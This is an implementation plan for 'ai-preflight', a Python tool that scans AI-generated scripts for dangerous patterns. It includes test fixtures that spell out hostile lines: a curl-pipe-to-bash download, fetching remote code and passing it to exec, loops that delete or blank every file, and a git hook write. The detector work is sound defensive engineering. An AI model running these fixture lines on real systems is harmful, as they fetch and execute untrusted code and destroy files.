# ai-preflight Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.
>
> **Note for this project specifically:** the user wants to type every line of code themselves, with guidance, not have it written for them. If executed by an agent worker anyway, each task's code blocks are the reference answer — a human learner should be given the chance to write it first and only shown the block if stuck.

**Goal:** Build `ai-preflight`, a Python CLI that scans a `.py` script for dangerous automation patterns (silent installs, mass file rewrites, remote code execution, etc.) and reports them before the user runs the script.

**Architecture:** A small package with four single-responsibility modules — `rules.py` (data only), `scanner.py` (detection logic), `report.py` (formatting), `cli.py` (entry point) — following the design in `docs/superpowers/specs/2026-09-08-ai-preflight-design.md`.

**Tech Stack:** Python 3.9+, standard library only (`re`, `argparse`, `os`), `pytest` for tests, `setuptools` for packaging.

## Global Constraints
- Python >= 3.9 (per spec).
- No third-party runtime dependencies — standard library only for v1.
- Test framework: `pytest`.
- License: MIT.
- Code identifiers, strings, and comments in Python files: no accented characters (matches convention already used in the design spec's rule examples, avoids encoding issues seen earlier in the project).
- Every rule ships with a "perigoso" (must match) and a "seguro" (must not match) fixture, per spec.

---

### Task 1: Project scaffolding

**Files:**
- Create: `pyproject.toml`
- Create: `ai_preflight/__init__.py`
- Create: `tests/__init__.py`
- Create: `tests/test_scaffolding.py`

**Interfaces:**
- Consumes: nothing (first task).
- Produces: an installable package named `ai_preflight`, importable in tests.

- [ ] **Step 1: Create `pyproject.toml`**

```toml
[project]
name = "ai-preflight"
version = "0.1.0"
description = "Analisa scripts Python gerados por IA em busca de padroes perigosos antes de voce rodar."
readme = "README.md"
requires-python = ">=3.9"
license = {text = "MIT"}

[project.scripts]
ai-preflight = "ai_preflight.cli:main"

[build-system]
requires = ["setuptools>=61.0"]
build-backend = "setuptools.build_meta"
```

- [ ] **Step 2: Create the empty package files**

`ai_preflight/__init__.py`:
```python
```
(empty file — just marks the folder as a package)

`tests/__init__.py`:
```python
```
(empty file)

- [ ] **Step 3: Write a smoke test proving the package imports**

`tests/test_scaffolding.py`:
```python
def test_package_importa():
    import ai_preflight
    assert ai_preflight is not None
```

- [ ] **Step 4: Install the package in editable mode**

Run: `pip install -e .`
Expected: installs successfully, prints something like `Successfully installed ai-preflight-0.1.0`.

- [ ] **Step 5: Run the smoke test**

Run: `pytest tests/test_scaffolding.py -v`
Expected: `1 passed`.

- [ ] **Step 6: Commit**

```bash
git add pyproject.toml ai_preflight/__init__.py tests/__init__.py tests/test_scaffolding.py
git commit -m "chore: project scaffolding"
```

---

### Task 2: rules.py — data structure and first rule

**Files:**
- Create: `ai_preflight/rules.py`
- Test: `tests/test_rules.py`

**Interfaces:**
- Consumes: nothing.
- Produces: `ai_preflight.rules.ALL_RULES` (a `list[dict]`), `ai_preflight.rules.RULE_LINHA` (`str`, value `"linha"`), `ai_preflight.rules.RULE_COOCORRENCIA` (`str`, value `"coocorrencia"`). Every rule dict of type `RULE_LINHA` has keys: `id`, `tipo`, `severidade`, `padrao`, `mensagem`. Later tasks (3+) rely on this exact shape.

- [ ] **Step 1: Write the failing test**

`tests/test_rules.py`:
```python
from ai_preflight.rules import ALL_RULES, RULE_LINHA


def test_regra_silent_package_install_existe():
    encontradas = [r for r in ALL_RULES if r["id"] == "silent-package-install"]
    assert len(encontradas) == 1
    regra = encontradas[0]
    assert regra["tipo"] == RULE_LINHA
    assert regra["severidade"] == "CRITICA"
    assert "padrao" in regra
    assert "mensagem" in regra
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_rules.py -v`
Expected: FAIL with `ModuleNotFoundError` or `ImportError` (rules.py does not exist yet).

- [ ] **Step 3: Write `rules.py`**

```python
RULE_LINHA = "linha"
RULE_COOCORRENCIA = "coocorrencia"

ALL_RULES = [
    {
        "id": "silent-package-install",
        "tipo": RULE_LINHA,
        "severidade": "CRITICA",
        "padrao": r"subprocess\.(run|call|Popen)\(.*\b(pip|npm)\b.*install",
        "mensagem": "Instalacao de pacote embutida no script, sem pedir confirmacao.",
    },
]
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_rules.py -v`
Expected: `1 passed`.

- [ ] **Step 5: Commit**

```bash
git add ai_preflight/rules.py tests/test_rules.py
git commit -m "feat: add rules data structure and silent-package-install rule"
```

---

### Task 3: scanner.py — line-rule engine

**Files:**
- Create: `ai_preflight/scanner.py`
- Create: `tests/fixtures/silent_package_install_perigoso.py`
- Create: `tests/fixtures/silent_package_install_seguro.py`
- Test: `tests/test_scanner.py`

**Interfaces:**
- Consumes: `ai_preflight.rules.ALL_RULES` (Task 2 shape).
- Produces: `ai_preflight.scanner.escanear_arquivo(caminho: str, regras: list[dict]) -> list[dict]`. Each returned finding ("achado") has keys: `regra_id` (str), `severidade` (str), `linha` (int or None), `mensagem` (str), `trecho` (str). Later tasks (4, 6, 7, 8, 9, 10, 11) rely on this exact function name, signature, and finding shape.

- [ ] **Step 1: Create the "perigoso" fixture**

`tests/fixtures/silent_package_install_perigoso.py`:
```python
import subprocess

subprocess.run(["pip", "install", "requests"], check=True)
```

- [ ] **Step 2: Create the "seguro" fixture**

`tests/fixtures/silent_package_install_seguro.py`:
```python
import subprocess

subprocess.run(["echo", "eu uso pip no meu dia a dia"])
```

- [ ] **Step 3: Write the failing test**

`tests/test_scanner.py`:
```python
from ai_preflight.rules import ALL_RULES
from ai_preflight.scanner import escanear_arquivo


def _regra(id_da_regra):
    return [r for r in ALL_RULES if r["id"] == id_da_regra]


def test_detecta_silent_package_install_no_arquivo_perigoso():
    regra = _regra("silent-package-install")
    achados = escanear_arquivo("tests/fixtures/silent_package_install_perigoso.py", regra)
    assert len(achados) == 1
    assert achados[0]["regra_id"] == "silent-package-install"
    assert achados[0]["severidade"] == "CRITICA"
    assert achados[0]["linha"] == 3


def test_nao_detecta_no_arquivo_seguro():
    regra = _regra("silent-package-install")
    achados = escanear_arquivo("tests/fixtures/silent_package_install_seguro.py", regra)
    assert achados == []
```

- [ ] **Step 4: Run test to verify it fails**

Run: `pytest tests/test_scanner.py -v`
Expected: FAIL with `ModuleNotFoundError` (scanner.py does not exist yet).

- [ ] **Step 5: Write `scanner.py` (line-rule engine only)**

```python
import re


def escanear_arquivo(caminho, regras):
    with open(caminho, "r", encoding="utf-8", errors="ignore") as f:
        linhas = f.readlines()

    achados = []
    for regra in regras:
        if regra["tipo"] == "linha":
            achados.extend(_escanear_regra_linha(regra, linhas))
    return achados


def _escanear_regra_linha(regra, linhas):
    achados = []
    padrao = re.compile(regra["padrao"])
    for numero, linha in enumerate(linhas, start=1):
        if padrao.search(linha):
            achados.append({
                "regra_id": regra["id"],
                "severidade": regra["severidade"],
                "linha": numero,
                "mensagem": regra["mensagem"],
                "trecho": linha.strip(),
            })
    return achados
```

- [ ] **Step 6: Run test to verify it passes**

Run: `pytest tests/test_scanner.py -v`
Expected: `2 passed`.

- [ ] **Step 7: Commit**

```bash
git add ai_preflight/scanner.py tests/fixtures/silent_package_install_perigoso.py tests/fixtures/silent_package_install_seguro.py tests/test_scanner.py
git commit -m "feat: scanner engine for line-type rules"
```

---

### Task 4: rules.py + scanner.py — coocorrencia-rule engine

**Files:**
- Modify: `ai_preflight/rules.py`
- Modify: `ai_preflight/scanner.py`
- Create: `tests/fixtures/mass_file_rewrite_perigoso.py`
- Create: `tests/fixtures/mass_file_rewrite_seguro.py`
- Modify: `tests/test_scanner.py`

**Interfaces:**
- Consumes: `escanear_arquivo` (Task 3 signature, must keep working for line rules).
- Produces: rule dicts of type `RULE_COOCORRENCIA` now have keys `id`, `tipo`, `severidade`, `padrao_a`, `padrao_b`, `mensagem` (no `padrao` key). `escanear_arquivo` now also handles this type; findings from coocorrencia rules have `linha: None`.

- [ ] **Step 1: Create the "perigoso" fixture**

`tests/fixtures/mass_file_rewrite_perigoso.py`:
```python
import os

for root, dirs, files in os.walk("."):
    for nome in files:
        caminho = os.path.join(root, nome)
        with open(caminho, "w") as fh:
            fh.write("")
```

- [ ] **Step 2: Create the "seguro" fixture**

`tests/fixtures/mass_file_rewrite_seguro.py`:
```python
import os

for root, dirs, files in os.walk("."):
    for nome in files:
        caminho = os.path.join(root, nome)
        with open(caminho, "r") as fh:
            conteudo = fh.read()
```

- [ ] **Step 3: Add the failing test**

Append to `tests/test_scanner.py`:
```python
def test_detecta_mass_file_rewrite_no_arquivo_perigoso():
    regra = _regra("mass-file-rewrite")
    achados = escanear_arquivo("tests/fixtures/mass_file_rewrite_perigoso.py", regra)
    assert len(achados) == 1
    assert achados[0]["regra_id"] == "mass-file-rewrite"
    assert achados[0]["linha"] is None


def test_nao_detecta_mass_file_rewrite_no_arquivo_seguro():
    regra = _regra("mass-file-rewrite")
    achados = escanear_arquivo("tests/fixtures/mass_file_rewrite_seguro.py", regra)
    assert achados == []
```

- [ ] **Step 4: Run test to verify it fails**

Run: `pytest tests/test_scanner.py -v`
Expected: FAIL — `_regra("mass-file-rewrite")` returns an empty list, so `escanear_arquivo` gets no rules and the assertion `len(achados) == 1` fails with `0 != 1`.

- [ ] **Step 5: Add the rule to `rules.py`**

Append to `ALL_RULES` in `ai_preflight/rules.py`:
```python
    {
        "id": "mass-file-rewrite",
        "tipo": RULE_COOCORRENCIA,
        "severidade": "CRITICA",
        "padrao_a": r"os\.walk\(",
        "padrao_b": r"open\([^)]*['\"]w['\"]",
        "mensagem": "Arquivo varre o projeto (os.walk) e reescreve arquivos (open com modo 'w') no mesmo script.",
    },
```

- [ ] **Step 6: Extend `scanner.py` with the coocorrencia engine**

Modify `escanear_arquivo` in `ai_preflight/scanner.py`:
```python
def escanear_arquivo(caminho, regras):
    with open(caminho, "r", encoding="utf-8", errors="ignore") as f:
        linhas = f.readlines()
    conteudo = "".join(linhas)

    achados = []
    for regra in regras:
        if regra["tipo"] == "linha":
            achados.extend(_escanear_regra_linha(regra, linhas))
        elif regra["tipo"] == "coocorrencia":
            achado = _escanear_regra_coocorrencia(regra, conteudo, linhas)
            if achado is not None:
                achados.append(achado)
    return achados
```

Add below `_escanear_regra_linha`:
```python
def _escanear_regra_coocorrencia(regra, conteudo, linhas):
    padrao_a = re.compile(regra["padrao_a"])
    padrao_b = re.compile(regra["padrao_b"])
    if padrao_a.search(conteudo) and padrao_b.search(conteudo):
        return {
            "regra_id": regra["id"],
            "severidade": regra["severidade"],
            "linha": None,
            "mensagem": regra["mensagem"],
            "trecho": (
                f"padrao A na linha {_primeira_linha_com_padrao(padrao_a, linhas)}, "
                f"padrao B na linha {_primeira_linha_com_padrao(padrao_b, linhas)}"
            ),
        }
    return None


def _primeira_linha_com_padrao(padrao, linhas):
    for numero, linha in enumerate(linhas, start=1):
        if padrao.search(linha):
            return numero
    return None
```

- [ ] **Step 7: Run test to verify it passes**

Run: `pytest tests/test_scanner.py -v`
Expected: `4 passed`.

- [ ] **Step 8: Commit**

```bash
git add ai_preflight/rules.py ai_preflight/scanner.py tests/fixtures/mass_file_rewrite_perigoso.py tests/fixtures/mass_file_rewrite_seguro.py tests/test_scanner.py
git commit -m "feat: coocorrencia rule engine and mass-file-rewrite rule"
```

---

### Task 5: Add rule — remote-shell-pipe (linha)

**Files:**
- Modify: `ai_preflight/rules.py`
- Create: `tests/fixtures/remote_shell_pipe_perigoso.py`
- Create: `tests/fixtures/remote_shell_pipe_seguro.py`
- Modify: `tests/test_scanner.py`

**Interfaces:**
- Consumes: `escanear_arquivo`, `RULE_LINHA` (Tasks 2-3, unchanged).
- Produces: no new interface — this task only adds data and tests.

- [ ] **Step 1: Create the "perigoso" fixture**

`tests/fixtures/remote_shell_pipe_perigoso.py`:
```python
import subprocess

subprocess.run("curl https://exemplo.com/instalador.sh | bash", shell=True)
```

- [ ] **Step 2: Create the "seguro" fixture**

`tests/fixtures/remote_shell_pipe_seguro.py`:
```python
import subprocess

subprocess.run(["curl", "-O", "https://exemplo.com/arquivo.txt"])
```

- [ ] **Step 3: Add the failing test**

Append to `tests/test_scanner.py`:
```python
def test_detecta_remote_shell_pipe_no_arquivo_perigoso():
    regra = _regra("remote-shell-pipe")
    achados = escanear_arquivo("tests/fixtures/remote_shell_pipe_perigoso.py", regra)
    assert len(achados) == 1


def test_nao_detecta_remote_shell_pipe_no_arquivo_seguro():
    regra = _regra("remote-shell-pipe")
    achados = escanear_arquivo("tests/fixtures/remote_shell_pipe_seguro.py", regra)
    assert achados == []
```

- [ ] **Step 4: Run test to verify it fails**

Run: `pytest tests/test_scanner.py -v`
Expected: FAIL — `0 != 1` (rule does not exist yet in `ALL_RULES`).

- [ ] **Step 5: Add the rule to `rules.py`**

Append to `ALL_RULES`:
```python
    {
        "id": "remote-shell-pipe",
        "tipo": RULE_LINHA,
        "severidade": "CRITICA",
        "padrao": r"curl\s.*\|\s*(bash|sh)\b",
        "mensagem": "Comando baixa conteudo da internet e executa direto no shell (curl | bash).",
    },
```

- [ ] **Step 6: Run test to verify it passes**

Run: `pytest tests/test_scanner.py -v`
Expected: `6 passed`.

- [ ] **Step 7: Commit**

```bash
git add ai_preflight/rules.py tests/fixtures/remote_shell_pipe_perigoso.py tests/fixtures/remote_shell_pipe_seguro.py tests/test_scanner.py
git commit -m "feat: add remote-shell-pipe rule"
```

---

### Task 6: Add rule — remote-code-execution (coocorrencia)

**Files:**
- Modify: `ai_preflight/rules.py`
- Create: `tests/fixtures/remote_code_execution_perigoso.py`
- Create: `tests/fixtures/remote_code_execution_seguro.py`
- Modify: `tests/test_scanner.py`

**Interfaces:**
- Consumes: `escanear_arquivo`, `RULE_COOCORRENCIA` (Task 4, unchanged).
- Produces: no new interface.

- [ ] **Step 1: Create the "perigoso" fixture**

`tests/fixtures/remote_code_execution_perigoso.py`:
```python
import requests

resposta = requests.get("https://exemplo.com/script.py")
exec(resposta.text)
```

- [ ] **Step 2: Create the "seguro" fixture**

`tests/fixtures/remote_code_execution_seguro.py`:
```python
import requests

resposta = requests.get("https://exemplo.com/dados.json")
dados = resposta.json()
print(dados)
```

- [ ] **Step 3: Add the failing test**

Append to `tests/test_scanner.py`:
```python
def test_detecta_remote_code_execution_no_arquivo_perigoso():
    regra = _regra("remote-code-execution")
    achados = escanear_arquivo("tests/fixtures/remote_code_execution_perigoso.py", regra)
    assert len(achados) == 1


def test_nao_detecta_remote_code_execution_no_arquivo_seguro():
    regra = _regra("remote-code-execution")
    achados = escanear_arquivo("tests/fixtures/remote_code_execution_seguro.py", regra)
    assert achados == []
```

- [ ] **Step 4: Run test to verify it fails**

Run: `pytest tests/test_scanner.py -v`
Expected: FAIL — `0 != 1`.

- [ ] **Step 5: Add the rule to `rules.py`**

Append to `ALL_RULES`:
```python
    {
        "id": "remote-code-execution",
        "tipo": RULE_COOCORRENCIA,
        "severidade": "CRITICA",
        "padrao_a": r"requests\.get\(|urllib\.request",
        "padrao_b": r"\b(exec|eval)\(",
        "mensagem": "Script baixa conteudo da internet (requests/urllib) e executa (exec/eval) no mesmo arquivo.",
    },
```

- [ ] **Step 6: Run test to verify it passes**

Run: `pytest tests/test_scanner.py -v`
Expected: `8 passed`.

- [ ] **Step 7: Commit**

```bash
git add ai_preflight/rules.py tests/fixtures/remote_code_execution_perigoso.py tests/fixtures/remote_code_execution_seguro.py tests/test_scanner.py
git commit -m "feat: add remote-code-execution rule"
```

---

### Task 7: Add rule — dynamic-eval-exec (linha)

**Files:**
- Modify: `ai_preflight/rules.py`
- Create: `tests/fixtures/dynamic_eval_exec_perigoso.py`
- Create: `tests/fixtures/dynamic_eval_exec_seguro.py`
- Modify: `tests/test_scanner.py`

**Interfaces:**
- Consumes: `escanear_arquivo`, `RULE_LINHA` (unchanged).
- Produces: no new interface.

- [ ] **Step 1: Create the "perigoso" fixture**

`tests/fixtures/dynamic_eval_exec_perigoso.py`:
```python
codigo_usuario = "print(1 + 1)"
exec(codigo_usuario)
```

- [ ] **Step 2: Create the "seguro" fixture**

`tests/fixtures/dynamic_eval_exec_seguro.py`:
```python
exec("print('ola mundo')")
```

- [ ] **Step 3: Add the failing test**

Append to `tests/test_scanner.py`:
```python
def test_detecta_dynamic_eval_exec_no_arquivo_perigoso():
    regra = _regra("dynamic-eval-exec")
    achados = escanear_arquivo("tests/fixtures/dynamic_eval_exec_perigoso.py", regra)
    assert len(achados) == 1


def test_nao_detecta_dynamic_eval_exec_no_arquivo_seguro():
    regra = _regra("dynamic-eval-exec")
    achados = escanear_arquivo("tests/fixtures/dynamic_eval_exec_seguro.py", regra)
    assert achados == []
```

- [ ] **Step 4: Run test to verify it fails**

Run: `pytest tests/test_scanner.py -v`
Expected: FAIL — `0 != 1`.

- [ ] **Step 5: Add the rule to `rules.py`**

Append to `ALL_RULES`:
```python
    {
        "id": "dynamic-eval-exec",
        "tipo": RULE_LINHA,
        "severidade": "ALTA",
        "padrao": r"\b(eval|exec)\(\s*(?![\"'])",
        "mensagem": "eval/exec chamado sobre uma variavel, nao um texto fixo — risco de executar codigo desconhecido.",
    },
```

- [ ] **Step 6: Run test to verify it passes**

Run: `pytest tests/test_scanner.py -v`
Expected: `10 passed`.

- [ ] **Step 7: Commit**

```bash
git add ai_preflight/rules.py tests/fixtures/dynamic_eval_exec_perigoso.py tests/fixtures/dynamic_eval_exec_seguro.py tests/test_scanner.py
git commit -m "feat: add dynamic-eval-exec rule"
```

---

### Task 8: Add rule — mass-delete (coocorrencia)

**Files:**
- Modify: `ai_preflight/rules.py`
- Create: `tests/fixtures/mass_delete_perigoso.py`
- Create: `tests/fixtures/mass_delete_seguro.py`
- Modify: `tests/test_scanner.py`

**Interfaces:**
- Consumes: `escanear_arquivo`, `RULE_COOCORRENCIA` (unchanged).
- Produces: no new interface.

- [ ] **Step 1: Create the "perigoso" fixture**

`tests/fixtures/mass_delete_perigoso.py`:
```python
import os

for nome in os.listdir("."):
    os.remove(nome)
```

- [ ] **Step 2: Create the "seguro" fixture**

`tests/fixtures/mass_delete_seguro.py`:
```python
import os

arquivo = "temporario.txt"
if os.path.exists(arquivo):
    os.remove(arquivo)
```

- [ ] **Step 3: Add the failing test**

Append to `tests/test_scanner.py`:
```python
def test_detecta_mass_delete_no_arquivo_perigoso():
    regra = _regra("mass-delete")
    achados = escanear_arquivo("tests/fixtures/mass_delete_perigoso.py", regra)
    assert len(achados) == 1


def test_nao_detecta_mass_delete_no_arquivo_seguro():
    regra = _regra("mass-delete")
    achados = escanear_arquivo("tests/fixtures/mass_delete_seguro.py", regra)
    assert achados == []
```

- [ ] **Step 4: Run test to verify it fails**

Run: `pytest tests/test_scanner.py -v`
Expected: FAIL — `0 != 1`.

- [ ] **Step 5: Add the rule to `rules.py`**

Append to `ALL_RULES`:
```python
    {
        "id": "mass-delete",
        "tipo": RULE_COOCORRENCIA,
        "severidade": "ALTA",
        "padrao_a": r"\b(for|while)\b",
        "padrao_b": r"shutil\.rmtree\(|os\.remove\(",
        "mensagem": "Deleta arquivos (shutil.rmtree/os.remove) dentro de um laco — risco de apagar mais do que deveria.",
    },
```

- [ ] **Step 6: Run test to verify it passes**

Run: `pytest tests/test_scanner.py -v`
Expected: `12 passed`.

- [ ] **Step 7: Commit**

```bash
git add ai_preflight/rules.py tests/fixtures/mass_delete_perigoso.py tests/fixtures/mass_delete_seguro.py tests/test_scanner.py
git commit -m "feat: add mass-delete rule"
```

---

### Task 9: Add rule — git-hook-injection (linha)

**Files:**
- Modify: `ai_preflight/rules.py`
- Create: `tests/fixtures/git_hook_injection_perigoso.py`
- Create: `tests/fixtures/git_hook_injection_seguro.py`
- Modify: `tests/test_scanner.py`

**Interfaces:**
- Consumes: `escanear_arquivo`, `RULE_LINHA` (unchanged).
- Produces: no new interface. This is the last rule — `ALL_RULES` now has all 7 entries used by Task 11's end-to-end test.

- [ ] **Step 1: Create the "perigoso" fixture**

`tests/fixtures/git_hook_injection_perigoso.py`:
```python
with open(".git/hooks/pre-commit", "w") as f:
    f.write("#!/bin/sh\npython auditor.py\n")
```

- [ ] **Step 2: Create the "seguro" fixture**

`tests/fixtures/git_hook_injection_seguro.py`:
```python
with open(".git/hooks/pre-commit", "r") as f:
    conteudo = f.read()
```

- [ ] **Step 3: Add the failing test**

Append to `tests/test_scanner.py`:
```python
def test_detecta_git_hook_injection_no_arquivo_perigoso():
    regra = _regra("git-hook-injection")
    achados = escanear_arquivo("tests/fixtures/git_hook_injection_perigoso.py", regra)
    assert len(achados) == 1


def test_nao_detecta_git_hook_injection_no_arquivo_seguro():
    regra = _regra("git-hook-injection")
    achados = escanear_arquivo("tests/fixtures/git_hook_injection_seguro.py", regra)
    assert achados == []
```

- [ ] **Step 4: Run test to verify it fails**

Run: `pytest tests/test_scanner.py -v`
Expected: FAIL — `0 != 1`.

- [ ] **Step 5: Add the rule to `rules.py`**

Append to `ALL_RULES`:
```python
    {
        "id": "git-hook-injection",
        "tipo": RULE_LINHA,
        "severidade": "MEDIA",
        "padrao": r"open\([^)]*\.git[\\/]+hooks[^)]*['\"]w['\"]",
        "mensagem": "Escreve dentro de .git/hooks — instala automacao que roda em todo commit, sem voce perceber.",
    },
```

- [ ] **Step 6: Run test to verify it passes**

Run: `pytest tests/test_scanner.py -v`
Expected: `14 passed`.

- [ ] **Step 7: Commit**

```bash
git add ai_preflight/rules.py tests/fixtures/git_hook_injection_perigoso.py tests/fixtures/git_hook_injection_seguro.py tests/test_scanner.py
git commit -m "feat: add git-hook-injection rule (all 7 v1 rules complete)"
```

---

### Task 10: report.py — formatting

**Files:**
- Create: `ai_preflight/report.py`
- Test: `tests/test_report.py`

**Interfaces:**
- Consumes: finding dicts shaped like `escanear_arquivo`'s output (Task 3: `regra_id`, `severidade`, `linha`, `mensagem`, `trecho`).
- Produces: `ai_preflight.report.formatar_relatorio(achados: list[dict]) -> str`. Task 11 relies on this exact name and signature.

- [ ] **Step 1: Write the failing test**

`tests/test_report.py`:
```python
from ai_preflight.report import formatar_relatorio


def test_relatorio_vazio():
    texto = formatar_relatorio([])
    assert "Nenhum padrao perigoso encontrado" in texto


def test_relatorio_ordena_por_severidade():
    achados = [
        {"regra_id": "r-media", "severidade": "MEDIA", "linha": 5, "mensagem": "m", "trecho": "t"},
        {"regra_id": "r-critica", "severidade": "CRITICA", "linha": 1, "mensagem": "m", "trecho": "t"},
        {"regra_id": "r-alta", "severidade": "ALTA", "linha": 2, "mensagem": "m", "trecho": "t"},
    ]
    texto = formatar_relatorio(achados)
    posicao_critica = texto.index("r-critica")
    posicao_alta = texto.index("r-alta")
    posicao_media = texto.index("r-media")
    assert posicao_critica < posicao_alta < posicao_media


def test_relatorio_mostra_arquivo_inteiro_quando_linha_e_none():
    achados = [{"regra_id": "r-coocorrencia", "severidade": "CRITICA", "linha": None, "mensagem": "m", "trecho": "t"}]
    texto = formatar_relatorio(achados)
    assert "arquivo inteiro" in texto
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_report.py -v`
Expected: FAIL with `ModuleNotFoundError` (report.py does not exist yet).

- [ ] **Step 3: Write `report.py`**

```python
ORDEM_SEVERIDADE = {"CRITICA": 0, "ALTA": 1, "MEDIA": 2}


def formatar_relatorio(achados):
    if not achados:
        return (
            "Nenhum padrao perigoso encontrado.\n"
            "Isso nao garante que o script e seguro — revise manualmente antes de rodar."
        )

    achados_ordenados = sorted(achados, key=lambda a: ORDEM_SEVERIDADE.get(a["severidade"], 99))

    linhas_saida = ["RELATORIO DE PREFLIGHT", "=" * 40]
    for achado in achados_ordenados:
        local = f"linha {achado['linha']}" if achado["linha"] is not None else "arquivo inteiro"
        linhas_saida.append(f"[{achado['severidade']}] {achado['regra_id']} ({local})")
        linhas_saida.append(f"  {achado['mensagem']}")
        linhas_saida.append(f"  Trecho: {achado['trecho']}")
        linhas_saida.append("")

    return "\n".join(linhas_saida)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_report.py -v`
Expected: `3 passed`.

- [ ] **Step 5: Commit**

```bash
git add ai_preflight/report.py tests/test_report.py
git commit -m "feat: report formatting"
```

---

### Task 11: cli.py — wiring and error handling

**Files:**
- Create: `ai_preflight/cli.py`
- Test: `tests/test_cli.py`

**Interfaces:**
- Consumes: `ai_preflight.rules.ALL_RULES` (Task 9, 7 rules), `ai_preflight.scanner.escanear_arquivo` (Task 3/4), `ai_preflight.report.formatar_relatorio` (Task 10).
- Produces: `ai_preflight.cli.main(argv: list[str] | None = None) -> int`. Exit code `1` if any `CRITICA` finding, `2` on file/usage errors, `0` otherwise. This is what `pyproject.toml`'s `ai-preflight` command (Task 1) points to.

- [ ] **Step 1: Write the failing test**

`tests/test_cli.py`:
```python
from ai_preflight.cli import main


def test_main_retorna_1_quando_ha_achado_critico(capsys):
    codigo = main(["tests/fixtures/silent_package_install_perigoso.py"])
    saida = capsys.readouterr().out
    assert codigo == 1
    assert "silent-package-install" in saida


def test_main_retorna_0_quando_arquivo_e_seguro(capsys):
    codigo = main(["tests/fixtures/silent_package_install_seguro.py"])
    assert codigo == 0


def test_main_retorna_2_quando_arquivo_nao_existe(capsys):
    codigo = main(["nao_existe.py"])
    saida = capsys.readouterr().out
    assert codigo == 2
    assert "nao encontrado" in saida.lower()


def test_main_retorna_2_quando_arquivo_nao_e_py(capsys, tmp_path):
    arquivo_txt = tmp_path / "nota.txt"
    arquivo_txt.write_text("ola")
    codigo = main([str(arquivo_txt)])
    assert codigo == 2
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_cli.py -v`
Expected: FAIL with `ModuleNotFoundError` (cli.py does not exist yet).

- [ ] **Step 3: Write `cli.py`**

```python
import argparse
import sys

from ai_preflight.rules import ALL_RULES
from ai_preflight.scanner import escanear_arquivo
from ai_preflight.report import formatar_relatorio


def main(argv=None):
    parser = argparse.ArgumentParser(
        prog="ai-preflight",
        description="Analisa um script Python em busca de padroes perigosos antes de voce rodar.",
    )
    parser.add_argument("arquivo", help="Caminho do arquivo .py a ser analisado")
    args = parser.parse_args(argv)

    if not args.arquivo.endswith(".py"):
        print("ai-preflight so analisa arquivos .py na versao atual.")
        return 2

    try:
        achados = escanear_arquivo(args.arquivo, ALL_RULES)
    except FileNotFoundError:
        print(f"Arquivo nao encontrado: {args.arquivo}")
        return 2

    print(formatar_relatorio(achados))

    if any(a["severidade"] == "CRITICA" for a in achados):
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_cli.py -v`
Expected: `4 passed`.

- [ ] **Step 5: Run the full test suite**

Run: `pytest -v`
Expected: all tests across `test_scaffolding.py` (1), `test_rules.py` (1), `test_scanner.py` (14), `test_report.py` (3), `test_cli.py` (4) pass — 23 tests total.

- [ ] **Step 6: Commit**

```bash
git add ai_preflight/cli.py tests/test_cli.py
git commit -m "feat: CLI entry point"
```

---

### Task 12: Packaging, README, and real end-to-end run

**Files:**
- Create: `README.md`
- Create: `LICENSE`
- Create: `.gitignore`

**Interfaces:**
- Consumes: everything from Tasks 1-11.
- Produces: nothing further consumed by other tasks — this is the last task.

- [ ] **Step 1: Create `LICENSE`**

`LICENSE` (MIT, fill in the year and name):
```
MIT License

Copyright (c) 2026 Denilson Pereira

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

- [ ] **Step 2: Create `.gitignore`**

`.gitignore`:
```
__pycache__/
*.pyc
*.egg-info/
build/
dist/
.pytest_cache/
```

- [ ] **Step 3: Create `README.md`**

`README.md`:
```markdown
# ai-preflight

Analisa um script Python gerado por IA (Gemini, ChatGPT, Claude, qualquer uma)
em busca de padroes perigosos — antes de voce rodar o script.

Nasceu de um caso real: um script "de otimizacao" continha uma funcao que
reescrevia arquivos do projeto com uma regex quebrada, corrompendo codigo
silenciosamente. `ai-preflight` procura por esse tipo de padrao.

## Instalacao

```bash
pip install -e .
```

## Uso

```bash
ai-preflight caminho/do/script.py
```

## O que ele detecta (v1)

- Instalacao de pacote embutida no script (pip/npm via subprocess)
- Reescrita de arquivos em massa (os.walk + open com modo 'w')
- Pipe de conteudo remoto direto pro shell (curl | bash)
- Download de codigo + execucao (requests/urllib + exec/eval)
- eval/exec sobre variavel dinamica
- Delecao de arquivos dentro de um laco
- Escrita dentro de .git/hooks

## Limitacoes

Isso e uma checagem por padroes de texto, nao uma garantia de seguranca.
Um resultado limpo nao significa que o script e seguro — significa que
nenhum dos padroes conhecidos foi encontrado. Leia o script.

## Licenca

MIT
```

- [ ] **Step 4: Run the real tool against a known-dangerous fixture, by hand**

Run: `ai-preflight tests/fixtures/silent_package_install_perigoso.py`
Expected output includes:
```
RELATORIO DE PREFLIGHT
========================================
[CRITICA] silent-package-install (linha 3)
  Instalacao de pacote embutida no script, sem pedir confirmacao.
  Trecho: subprocess.run(["pip", "install", "requests"], check=True)
```
Expected exit code: `1` (check with `echo $?` on bash or `echo $LASTEXITCODE` on PowerShell).

